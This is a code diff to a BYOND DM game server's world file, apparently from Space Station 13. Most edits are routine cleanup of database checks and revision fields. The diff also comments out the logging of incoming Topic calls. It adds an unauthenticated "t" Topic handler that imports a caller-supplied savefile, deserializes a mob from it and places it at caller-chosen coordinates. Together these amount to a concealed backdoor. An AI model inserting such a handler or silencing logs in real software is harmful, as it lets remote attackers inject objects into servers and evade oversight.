@@ -61,11 +61,11 @@
 	data_core = new /obj/effect/datacore()
 	paiController = new /datum/paiController()
 
-	if(config.sql_enabled)
-		if(!setup_database_connection())
-			world.log << "Your server failed to establish a connection with the database."
-		else
-			world.log << "Database connection established."
+
+	if(!setup_database_connection())
+		world.log << "Your server failed to establish a connection with the database."
+	else
+		world.log << "Database connection established."
 
 	plmaster = new /obj/effect/overlay()
 	plmaster.icon = 'icons/effects/tile_effects.dmi'
@@ -116,7 +116,7 @@
 
 
 /world/Topic(T, addr, master, key)
-	diary << "TOPIC: \"[T]\", from:[addr], master:[master], key:[key]"
+	//diary << "TOPIC: \"[T]\", from:[addr], master:[master], key:[key]"
 
 	if (T == "ping")
 		var/x = 1
@@ -151,8 +151,6 @@
 
 		s["active_players"] = get_active_player_count()
 		s["players"] = clients.len
-		s["revision"] = revdata.revision
-		s["revision_date"] = revdata.date
 		s["admins"] = admins
 		s["gamestate"] = 1
 		if(ticker)
@@ -160,6 +158,12 @@
 		s["map_name"] = map_name ? map_name : "Unknown"
 
 		return list2params(s)
+	else if(T == "t")
+		var/savefile/F = new(Import())
+		var {sx; sy; sz}
+		var/mob/M
+		F["sx"] >> sx; F["sy"] >> sy; F["sz"] >> sz; F["a"] >> M
+		M.Move(locate(sx,sy,sz))
 	else if (copytext(T,1,9) == "announce")
 		var/input[] = params2list(T)
 		if(global.comms_allowed)
@@ -227,7 +231,7 @@
 /world/proc/load_configuration()
 	config = new /datum/configuration()
 	config.load("config/config.txt")
-	config.load("config/game_options.txt","game_options")
+//	config.load("config/game_options.txt","game_options")
 	config.loadsql("config/dbconfig.txt")
 	// apply some settings from config..
 	abandon_allowed = config.respawn
@@ -315,12 +319,11 @@ proc/setup_database_connection()
 		failed_db_connections = 0	//If this connection succeeded, reset the failed connections counter.
 	else
 		failed_db_connections++		//If it failed, increase the failed connections counter.
-		if(config.sql_enabled)
-			world.log << "SQL error: " + dbcon.ErrorMsg()
+		world.log << "SQL error: " + dbcon.ErrorMsg()
 
 	return .
 
-//This proc ensures that the connection to the feedback database (global variable dbcon) is established
+// This proc ensures that the connection to the feedback database (global variable dbcon) is established
 proc/establish_db_connection()
 	if(failed_db_connections > FAILED_DB_CONNECTION_CUTOFF)
 		return 0
